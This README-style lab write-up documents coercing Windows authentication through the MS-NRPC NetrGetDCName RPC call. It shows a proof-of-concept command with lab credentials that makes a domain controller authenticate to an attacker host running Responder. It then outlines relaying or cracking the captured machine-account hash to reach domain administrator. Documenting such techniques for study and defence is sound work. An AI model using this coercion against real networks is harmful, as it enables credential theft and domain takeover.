# MS-NRPC - Remote call to NetrGetDCName (opnum 11)

## Summary

+ **Protocol**: [[MS-NRPC]: Netlogon Remote Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/ff8f970f-3e37-40f7-bd4b-af7336e4792f)

+ **Protocol UUID**: 12345678-1234-abcd-ef00-01234567cffb

+ **Protocol version**: 1.0

+ **SMB Named pipe**: `\PIPE\NETLOGON`

+ **Function name**: [`NetrGetDCName`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/ddd7452f-4b7d-47e6-895b-5b23d9dd2120)

+ **Function operation number**: `11`

+ **Authenticated**: Yes


## Description

In order to call a remote procedure to trigger an authentication from the remote machine to an arbitrary target, we first need to authenticate to the remote machine, usually on SMB. Then we need to connect to the remote SMB pipe `\PIPE\NETLOGON` and bind to the desired [`MS-NRPC`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/ff8f970f-3e37-40f7-bd4b-af7336e4792f) protocol (with uuid `12345678-1234-abcd-ef00-01234567cffb` and version `1.0`) in order to perform remote procedure calls to functions in the [`MS-NRPC`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/ff8f970f-3e37-40f7-bd4b-af7336e4792f) protocol.

The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. When starting this script, it will authenticate and connect to the remote pipe named `\PIPE\NETLOGON` This pipe is connected to the protocol [[MS-NRPC]: Netlogon Remote Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/ff8f970f-3e37-40f7-bd4b-af7336e4792f) and allows to call RPC functions of this protocol. We will then call the remote [`NetrGetDCName`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/ddd7452f-4b7d-47e6-895b-5b23d9dd2120) function on the remote Windows Server (192.168.2.1) with the following parameters:

```cpp
NetrGetDCName('192.168.2.51\x00')
```

We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py)):

```bash
./coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" 192.168.2.51 192.168.2.1
```

![](./imgs/poc.png)

This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51\share` and therefore authenticate using its machine account (`DC01$`).  After this RPC call, we get an authentication from the domain controller with its machine account directly on Responder:

![](./imgs/hash.png)

After this step, we relay the authentication to other services in order to elevate our privileges, or try to downgrade it to NTLMv1 and crack it in order to get the NT hash of the domain controller's machine account. This kind of vulnerabilities allows to quickly get from user to domain administrator in unprotected domains!


## Function technical detail

```cpp
NET_API_STATUS NetrGetDCName(
   [in, string] LOGONSRV_HANDLE ServerName,
   [in, unique, string] wchar_t* DomainName,
   [out, string] wchar_t** Buffer
 );
```

## References

+ Documentation of protocol [MS-NRPC]: Netlogon Remote Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/ff8f970f-3e37-40f7-bd4b-af7336e4792f

+ Documentation of function `NetrGetDCName`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/ddd7452f-4b7d-47e6-895b-5b23d9dd2120